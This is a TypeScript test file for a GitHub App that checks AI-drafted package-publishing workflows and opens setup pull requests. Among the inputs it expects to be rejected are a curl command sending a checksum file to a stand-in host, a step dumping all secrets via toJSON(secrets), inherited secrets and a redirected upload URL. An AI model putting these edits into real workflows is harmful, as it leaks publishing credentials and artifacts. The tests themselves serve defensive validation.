import { afterEach, describe, expect, test, vi } from "vitest";
import { MockLanguageModelV3 } from "ai/test";
import {
  generateSetupDraft,
  setupDraftRequestSchema,
  signSetupProposal,
  validateSetupDraft,
  verifySetupProposal,
} from "../server/lib/github-app/setup-draft";
import {
  createSetupClient,
  createSetupPullRequest,
  inspectPublisherSetup,
  type SetupGithubClient,
} from "../server/lib/github-app/setup-api";
import type { GithubAppConfig } from "../server/lib/github-app/config";
import {
  SETUP_BASE_SHA,
  SETUP_BLOB_SHA,
  SETUP_DRAFT_REQUEST,
  SETUP_NPM_GUIDE_WORKFLOW,
  SETUP_NPM_STAGING_GUIDE_WORKFLOW,
  SETUP_ORIGINAL_WORKFLOW,
  SETUP_PROPOSED_WORKFLOW,
  SETUP_PYPI_GUIDE_WORKFLOW,
  SETUP_PYPI_ORIGINAL_WORKFLOW,
  SETUP_VSCODE_GUIDE_WORKFLOW,
  SETUP_VSCODE_ORIGINAL_WORKFLOW,
  setupProposal,
} from "./helpers/publisher-setup-fixtures";

vi.mock("../server/lib/github-app/jwt", () => ({
  generateGithubAppJwt: vi.fn(async () => "test-jwt"),
}));
afterEach(() => vi.unstubAllGlobals());
const config: GithubAppConfig = {
  appId: "123",
  appSlug: "drydock",
  clientId: "client",
  clientSecret: "secret",
  privateKeyPem: "unused",
  webhookSecret: "unused",
  stateSecret: "test-state-secret",
};

function client(request: SetupGithubClient["request"]): SetupGithubClient {
  return {
    repository: { id: 42, fullName: "octo/release", defaultBranch: "main" },
    path: "/repos/octo/release",
    request,
  };
}

describe("publisher setup proposal", () => {
  test("accepts build-once artifact review and publishing from downloaded bytes", () => {
    expect(() =>
      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, SETUP_PROPOSED_WORKFLOW, SETUP_DRAFT_REQUEST),
    ).not.toThrow();
  });
  test.each([
    [
      "ungated publisher",
      SETUP_PROPOSED_WORKFLOW.replace("environment: production", "environment: staging"),
    ],
    [
      "rebuild after review",
      SETUP_PROPOSED_WORKFLOW.replace(
        "npm publish *.tgz --provenance",
        "npm run build\n      - run: npm publish *.tgz --provenance",
      ),
    ],
    [
      "unreviewed directory publication",
      SETUP_PROPOSED_WORKFLOW.replace("npm publish *.tgz", "npm publish"),
    ],
    ["no upstream dependency", SETUP_PROPOSED_WORKFLOW.replace("needs: build", "needs: absent")],
    ["changed triggers", SETUP_PROPOSED_WORKFLOW.replace("workflow_dispatch:", "push:")],
    ["extra publisher", SETUP_PROPOSED_WORKFLOW + "      - run: npm publish *.tgz\n"],
    ["duplicate YAML keys", SETUP_PROPOSED_WORKFLOW + "jobs: {}\n"],
    [
      "publishing action without archive binding",
      SETUP_PROPOSED_WORKFLOW.replace(
        "- run: npm publish *.tgz --provenance",
        "- uses: JS-DevTools/npm-publish@v3",
      ),
    ],
    [
      "producer gated before upload",
      SETUP_PROPOSED_WORKFLOW.replace(
        "  build:\n",
        "  build:\n    environment:\n      name: production\n",
      ),
    ],
    [
      "archive name only in a shell comment",
      SETUP_PROPOSED_WORKFLOW.replace("npm publish *.tgz --provenance", "npm publish # *.tgz"),
    ],
    [
      "artifact download after publication",
      SETUP_PROPOSED_WORKFLOW.replace(
        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates\n      - run: npm publish *.tgz --provenance",
        "      - run: npm publish *.tgz --provenance\n      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates",
      ),
    ],
    [
      "foreign run artifact",
      SETUP_PROPOSED_WORKFLOW.replace(
        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates",
        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates\n          run-id: 123",
      ),
    ],
  ])("rejects %s", (_label, candidate) => {
    expect(() =>
      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, SETUP_DRAFT_REQUEST),
    ).toThrow();
  });
  const pypiRequest = { ...SETUP_DRAFT_REQUEST, ecosystem: "pypi" as const, environment: "pypi" };
  const vscodeRequest = { ...SETUP_DRAFT_REQUEST, ecosystem: "vscode" as const };
  const pinned = "actions/download-artifact@" + "d".repeat(40);
  test.each([
    ["npm guide", SETUP_ORIGINAL_WORKFLOW, SETUP_NPM_GUIDE_WORKFLOW, SETUP_DRAFT_REQUEST],
    [
      "npm gated staging guide",
      SETUP_ORIGINAL_WORKFLOW,
      SETUP_NPM_STAGING_GUIDE_WORKFLOW,
      SETUP_DRAFT_REQUEST,
    ],
    ["PyPI guide", SETUP_PYPI_ORIGINAL_WORKFLOW, SETUP_PYPI_GUIDE_WORKFLOW, pypiRequest],
    [
      "PyPI uv publish",
      SETUP_PYPI_ORIGINAL_WORKFLOW,
      SETUP_PYPI_GUIDE_WORKFLOW.replace(
        "      - run: rm dist/SHA256SUMS\n      - uses: pypa/gh-action-pypi-publish@release/v1",
        "      - run: uv publish dist/*.whl dist/*.tar.gz",
      ),
      pypiRequest,
    ],
    [
      "PyPI action with matching packages-dir",
      SETUP_PYPI_ORIGINAL_WORKFLOW,
      SETUP_PYPI_GUIDE_WORKFLOW.replaceAll("dist", "out").replace(
        "pypa/gh-action-pypi-publish@release/v1",
        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          packages-dir: out/\n          attestations: true",
      ),
      pypiRequest,
    ],
    ["VS Code guide", SETUP_VSCODE_ORIGINAL_WORKFLOW, SETUP_VSCODE_GUIDE_WORKFLOW, vscodeRequest],
    [
      "newer artifact actions",
      SETUP_ORIGINAL_WORKFLOW,
      SETUP_NPM_GUIDE_WORKFLOW.replaceAll("-artifact@v4", "-artifact@v5.0.1"),
      SETUP_DRAFT_REQUEST,
    ],
    [
      "a SHA pin the repository already uses",
      SETUP_ORIGINAL_WORKFLOW.replace(
        "      - run: npm ci\n",
        `      - uses: ${pinned}\n        with:\n          name: cache\n      - run: npm ci\n`,
      ),
      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/download-artifact@v4", pinned),
      SETUP_DRAFT_REQUEST,
    ],
    [
      "an environment named with different case",
      SETUP_ORIGINAL_WORKFLOW,
      SETUP_NPM_GUIDE_WORKFLOW.replace("environment: production", "environment: Production"),
      { ...SETUP_DRAFT_REQUEST, environment: "PRODUCTION" },
    ],
  ])("accepts the %s", (_label, original, candidate, request) => {
    expect(() => validateSetupDraft(original, candidate, request)).not.toThrow();
  });
  test.each([
    [
      "an unknown SHA pin",
      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/download-artifact@v4", pinned),
    ],
    [
      "a retired artifact action",
      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/upload-artifact@v4", "actions/upload-artifact@v3"),
    ],
    [
      "a shell override on the publisher",
      SETUP_NPM_GUIDE_WORKFLOW.replace(
        "      - run: npm publish *.tgz",
        "      - run: npm publish *.tgz\n        shell: python {0}",
      ),
    ],
    [
      "a shell default on the publish job",
      SETUP_NPM_GUIDE_WORKFLOW.replace(
        "    needs: pack\n",
        "    needs: pack\n    defaults:\n      run:\n        shell: python {0}\n",
      ),
    ],
    [
      "an arbitrary command after the download",
      SETUP_NPM_GUIDE_WORKFLOW.replace(
        "sha256sum --check --strict SHA256SUMS",
        "curl -d @SHA256SUMS https://example.invalid",
      ),
    ],
    [
      "a digest check outside the download directory",
      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
        "cd dist && sha256sum --check",
        "cd other && sha256sum --check",
      ),
    ],
    [
      "a publish path outside the download directory",
      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
        "npm stage publish dist/*.tgz",
        "npm stage publish *.tgz",
      ),
    ],
    [
      "a download outside the job directory",
      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
        "          path: dist\n",
        "          path: ../dist\n",
      ).replaceAll("dist/", "../dist/"),
    ],
    [
      "a dependency install in the publish job",
      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
        "npm install -g npm@^11.15.0",
        "npm install -g left-pad",
      ),
    ],
    [
      "a new secret reference",
      SETUP_NPM_GUIDE_WORKFLOW.replace(
        "      - run: npm publish *.tgz",
        "      - run: npm publish *.tgz\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
      ),
    ],
    [
      "dynamic secret access",
      SETUP_NPM_GUIDE_WORKFLOW.replace(
        "      - run: npm ci",
        "      - run: npm ci\n        env:\n          ALL: ${{ toJSON(secrets) }}",
      ),
    ],
    [
      "a reusable workflow inheriting secrets",
      SETUP_NPM_GUIDE_WORKFLOW +
        "  notify:\n    uses: octo/actions/.github/workflows/notify.yml@main\n    secrets: inherit\n",
    ],
  ])("rejects %s", (_label, candidate) => {
    expect(() =>
      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, SETUP_DRAFT_REQUEST),
    ).toThrow();
  });
  test.each([
    [
      "a mismatched packages-dir",
      SETUP_PYPI_GUIDE_WORKFLOW.replace(
        "pypa/gh-action-pypi-publish@release/v1",
        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          packages-dir: build/",
      ),
    ],
    [
      "a redirected repository",
      SETUP_PYPI_GUIDE_WORKFLOW.replace(
        "pypa/gh-action-pypi-publish@release/v1",
        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: https://example.invalid/legacy/",
      ),
    ],
    [
      "action inputs passed through env",
      SETUP_PYPI_GUIDE_WORKFLOW.replace(
        "pypa/gh-action-pypi-publish@release/v1",
        "pypa/gh-action-pypi-publish@release/v1\n        env:\n          INPUT_REPOSITORY-URL: https://example.invalid/legacy/",
      ),
    ],
  ])("rejects a PyPI publishing action with %s", (_label, candidate) => {
    expect(() => validateSetupDraft(SETUP_PYPI_ORIGINAL_WORKFLOW, candidate, pypiRequest)).toThrow(
      /publish the downloaded archives/,
    );
  });
  test("requires manual setup for privileged and indirectly triggered workflows", () => {
    expect(() =>
      validateSetupDraft(
        SETUP_ORIGINAL_WORKFLOW.replace("workflow_dispatch:", "pull_request_target:"),
        SETUP_PROPOSED_WORKFLOW,
        SETUP_DRAFT_REQUEST,
      ),
    ).toThrow(/manual setup/);
  });
  test("rejects a PyPI publishing action whose input is not bound to downloaded bytes", () => {
    const candidate = SETUP_PROPOSED_WORKFLOW.replaceAll(
      "npm-release-candidates",
      "pypi-release-candidate",
    ).replace(
      "- run: npm publish *.tgz --provenance",
      "- uses: pypa/gh-action-pypi-publish@release/v1",
    );
    expect(() =>
      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, {
        ...SETUP_DRAFT_REQUEST,
        ecosystem: "pypi",
      }),
    ).toThrow(/publish the downloaded archives/);
  });
  test("bounds environment and workflow input", () => {
    expect(
      setupDraftRequestSchema.safeParse({
        ...SETUP_DRAFT_REQUEST,
        workflowPath: "../../secrets.yml",
      }).success,
    ).toBe(false);
    expect(
      setupDraftRequestSchema.safeParse({ ...SETUP_DRAFT_REQUEST, environment: "prod\nuction" })
        .success,
    ).toBe(false);
    expect(
      setupDraftRequestSchema.parse({ ...SETUP_DRAFT_REQUEST, environment: " Production " })
        .environment,
    ).toBe("production");
  });
  test("binds proposals to purpose, content, organization, user, and expiry", async () => {
    const proposal = setupProposal();
    const token = await signSetupProposal("secret", proposal, "org-a", "user-a");
    expect(await verifySetupProposal("secret", proposal, token, "org-a", "user-a")).toBe(true);
    expect(await verifySetupProposal("secret", proposal, token, "org-b", "user-a")).toBe(false);
    expect(await verifySetupProposal("secret", proposal, token, "org-a", "user-b")).toBe(false);
    expect(
      await verifySetupProposal(
        "secret",
        { ...proposal, content: "changed" },
        token,
        "org-a",
        "user-a",
      ),
    ).toBe(false);
    expect(
      await verifySetupProposal(
        "secret",
        { ...proposal, expiresAt: Date.now() - 1 },
        token,
        "org-a",
        "user-a",
      ),
    ).toBe(false);
  });
  test("validates a structured model output before returning the draft", async () => {
    const model = new MockLanguageModelV3({
      doGenerate: async () => ({
        content: [
          {
            type: "text",
            text: JSON.stringify({
              content: SETUP_PROPOSED_WORKFLOW,
              summary: "Separate packaging and publication.",
            }),
          },
        ],
        finishReason: { unified: "stop", raw: "stop" },
        usage: {
          inputTokens: { total: 10, noCache: 10, cacheRead: 0, cacheWrite: 0 },
          outputTokens: { total: 10, text: 10, reasoning: 0 },
        },
        warnings: [],
      }),
    });
    const draft = await generateSetupDraft(
      {} as Cloudflare.Env,
      SETUP_DRAFT_REQUEST,
      SETUP_ORIGINAL_WORKFLOW,
      model,
    );
    expect(draft.content).toBe(SETUP_PROPOSED_WORKFLOW);
  });
});

describe("publisher setup GitHub boundary", () => {
  test("requests a single repository and read permissions without following redirects", async () => {
    const calls: Request[] = [];
    vi.stubGlobal(
      "fetch",
      vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
        const request = new Request(input, init);
        calls.push(request);
        return request.url.includes("access_tokens")
          ? Response.json({ token: "installation-token" })
          : Response.json({ id: 42, full_name: "octo/release", default_branch: "main" });
      }),
    );
    await createSetupClient(config, "100", "octo/release");
    expect(await calls[0].json()).toEqual({
      repositories: ["release"],
      permissions: { contents: "read", actions: "read" },
    });
    expect(
      calls.every(
        (request) =>
          request.redirect === "manual" && new URL(request.url).hostname === "api.github.com",
      ),
    ).toBe(true);
  });
  test("rejects renamed or foreign repository identity", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn(async (input: RequestInfo | URL) =>
        String(input).includes("access_tokens")
          ? Response.json({ token: "installation-token" })
          : Response.json({ id: 42, full_name: "other/release", default_branch: "main" }),
      ),
    );
    await expect(createSetupClient(config, "100", "octo/release")).rejects.toThrow(
      /no accessible default branch/,
    );
  });
  test("sanitizes missing permission errors", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn(async () => new Response("secret-upstream-response", { status: 422 })),
    );
    await expect(createSetupClient(config, "100", "octo/release", true)).rejects.toThrow(
      /Contents, Pull requests, and Workflows/,
    );
  });
  test("never fetches a workflow symlink or arbitrary download URL", async () => {
    const request = vi.fn(async (suffix: string) =>
      suffix.includes("git/ref")
        ? { object: { sha: SETUP_BASE_SHA } }
        : suffix.includes("?ref") && suffix.startsWith("/contents/.github/workflows?")
          ? [
              {
                type: "symlink",
                path: ".github/workflows/release.yml",
                download_url: "https://example.invalid",
              },
            ]
          : null,
    );
    expect((await inspectPublisherSetup(client(request), "row")).workflows).toEqual([]);
    expect(request).toHaveBeenCalledTimes(2);
  });
  test("refuses a stale default branch before writing", async () => {
    const request = vi.fn(async (suffix: string, _init?: RequestInit) =>
      suffix.startsWith("/pulls?") ? [] : { object: { sha: "c".repeat(40) } },
    );
    await expect(createSetupPullRequest(client(request), setupProposal())).rejects.toThrow(
      /default branch changed/,
    );
    expect(request.mock.calls.every(([, init]) => !init)).toBe(true);
  });
  test("recovers an existing proposal PR without any writes", async () => {
    const request = vi.fn(async (suffix: string) => {
      const head = new URL(`https://api.github.com${suffix}`).searchParams
        .get("head")
        ?.split(":")[1];
      return [
        {
          number: 12,
          head: { ref: head, repo: { id: 42 } },
          base: { ref: "main", repo: { id: 42 } },
        },
      ];
    });
    const result = await createSetupPullRequest(client(request), setupProposal());
    expect(result.number).toBe(12);
    expect(result.created).toBe(false);
    expect(request).toHaveBeenCalledTimes(1);
  });
  test("re-drafted identical content looks up the same branch and only open PRs", async () => {
    const lookups: URLSearchParams[] = [];
    const request = vi.fn(async (suffix: string) => {
      lookups.push(new URL(`https://api.github.com${suffix}`).searchParams);
      return [
        {
          number: 12,
          head: { ref: lookups.at(-1)?.get("head")?.split(":")[1], repo: { id: 42 } },
          base: { ref: "main", repo: { id: 42 } },
        },
      ];
    });
    await createSetupPullRequest(client(request), setupProposal());
    await createSetupPullRequest(
      client(request),
      setupProposal({ expiresAt: Date.now() + 60_000, summary: "Reworded." }),
    );
    expect(lookups[0].get("head")).toBe(lookups[1].get("head"));
    expect(lookups.every((params) => params.get("state") === "open")).toBe(true);
  });
  test("opens a draft PR and the same signed proposal reuses its stable branch", async () => {
    let branch: string | null = null;
    let opened = false;
    const writes: { suffix: string; body: Record<string, unknown> }[] = [];
    const request = vi.fn(async (suffix: string, init?: RequestInit) => {
      if (suffix.startsWith("/pulls?"))
        return opened
          ? [
              {
                number: 12,
                head: { ref: branch, repo: { id: 42 } },
                base: { ref: "main", repo: { id: 42 } },
              },
            ]
          : [];
      if (suffix === "/git/ref/heads/main") return { object: { sha: SETUP_BASE_SHA } };
      if (suffix.startsWith("/git/ref/heads/")) return null;
      if (suffix.includes("?ref="))
        return {
          type: "file",
          path: SETUP_DRAFT_REQUEST.workflowPath,
          sha: SETUP_BLOB_SHA,
          size: SETUP_ORIGINAL_WORKFLOW.length,
          content: btoa(SETUP_ORIGINAL_WORKFLOW),
          encoding: "base64",
        };
      const body = JSON.parse(String(init?.body)) as Record<string, unknown>;
      writes.push({ suffix, body });
      if (suffix === "/git/refs") branch = String(body.ref).slice("refs/heads/".length);
      if (suffix === "/pulls") {
        opened = true;
        return { number: 12 };
      }
      return {};
    });
    const proposal = setupProposal();
    await createSetupPullRequest(client(request), proposal);
    await createSetupPullRequest(client(request), proposal);
    expect(writes).toHaveLength(3);
    expect(writes[1].body.message).toContain("[skip ci]");
    expect(writes[2].body.draft).toBe(true);
  });
});
